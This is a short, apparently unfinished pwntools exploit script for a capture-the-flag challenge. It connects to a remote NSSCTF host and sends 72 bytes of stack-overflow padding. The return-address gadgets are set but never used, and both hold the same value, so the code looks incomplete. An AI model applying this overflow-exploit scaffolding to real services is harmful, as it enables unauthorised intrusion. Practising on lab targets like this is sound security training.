from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux',loglevel='debug')
elf=ELF('./pwn')
p=remote('node4.anna.nssctf.cn',23377)

pop_addr=0x0400743
main_addr=0x0400743

payload=b'a'*(64+8)

p.sendline(payload)
p.interactive()
